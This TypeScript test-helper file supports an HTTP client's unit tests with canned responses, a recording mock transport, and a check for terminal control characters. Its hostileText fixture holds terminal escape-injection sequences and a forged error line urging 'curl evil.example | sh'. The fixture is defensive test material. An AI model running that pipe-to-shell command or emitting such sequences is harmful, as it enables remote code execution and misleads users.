// Test helpers: build canned HTTP responses and a recording mock transport based
// on Node's built-in `node:test` mock facility. No real network is ever touched
// in the unit suite.

import { mock } from "node:test";
import type { Transport, HttpRequest, HttpResponse } from "../src/client/http.js";

/**
 * Whether a string holds a character a terminal may act on: C0 (ESC, BEL, CR, LF),
 * DEL or C1 (U+009B is the 8-bit CSI). Built from char codes so no raw control byte
 * appears in this source.
 */
export const hasControlChar = (text: string): boolean =>
  [...text].some((ch) => {
    const n = ch.codePointAt(0) ?? 0;
    return n <= 0x1f || (n >= 0x7f && n <= 0x9f);
  });

/**
 * A string of the kind a hostile server can put in any field: an OSC window-title
 * write, an ANSI colour, the 8-bit CSI, a forged `Error:` line on its own line, and
 * enough padding to bury the real diagnostic.
 */
export const hostileText = (tail = ""): string =>
  `${String.fromCharCode(0x1b)}]0;PWNED${String.fromCharCode(0x07)}${String.fromCharCode(0x1b)}[31mRED` +
  `${String.fromCharCode(0x9b)}2J\nError: your credentials expired, run: curl evil.example | sh\n${"A".repeat(3000)}${tail}`;

export function jsonResponse(value: unknown, status = 200, headers: Record<string, string> = {}): HttpResponse {
  return {
    status,
    headers: { "content-type": "application/json; charset=utf-8", ...headers },
    body: Buffer.from(JSON.stringify(value), "utf8"),
  };
}

export function rawResponse(
  data: string | Buffer,
  contentType: string,
  status = 200,
  headers: Record<string, string> = {},
): HttpResponse {
  return {
    status,
    headers: { "content-type": contentType, ...headers },
    body: Buffer.isBuffer(data) ? data : Buffer.from(data),
  };
}

export function redirect(location: string, status = 301): HttpResponse {
  return { status, headers: { location }, body: Buffer.alloc(0) };
}

export interface MockTransport {
  transport: Transport;
  /** All requests the transport has received, in order. */
  readonly calls: HttpRequest[];
  /** The most recent request. */
  last(): HttpRequest;
}

/**
 * Build a mock transport from a responder function. The returned object records
 * every request so tests can assert on method/url/headers.
 */
export function makeMockTransport(
  responder: (req: HttpRequest) => HttpResponse | Promise<HttpResponse>,
): MockTransport {
  const calls: HttpRequest[] = [];
  const fn = mock.fn(async (req: HttpRequest): Promise<HttpResponse> => {
    calls.push(req);
    return responder(req);
  });
  return {
    transport: fn as unknown as Transport,
    calls,
    last: () => {
      const c = calls[calls.length - 1];
      if (!c) throw new Error("mock transport has not been called");
      return c;
    },
  };
}

/**
 * A mock transport serving fixed responses by URL, ignoring the query string unless
 * the route key includes one. Unknown URLs answer 404.
 */
export function routes(table: Record<string, HttpResponse | ((req: HttpRequest) => HttpResponse)>): MockTransport {
  return makeMockTransport((req) => {
    const exact = table[req.url];
    const withoutQuery = table[req.url.split("?")[0] as string];
    const hit = exact ?? withoutQuery;
    if (hit === undefined) return jsonResponse({ error: "Not found", code: 802 }, 404);
    return typeof hit === "function" ? hit(req) : hit;
  });
}

/** Parse the query string of a recorded request URL into a URLSearchParams. */
export function queryOf(req: HttpRequest): URLSearchParams {
  return new URL(req.url).searchParams;
}
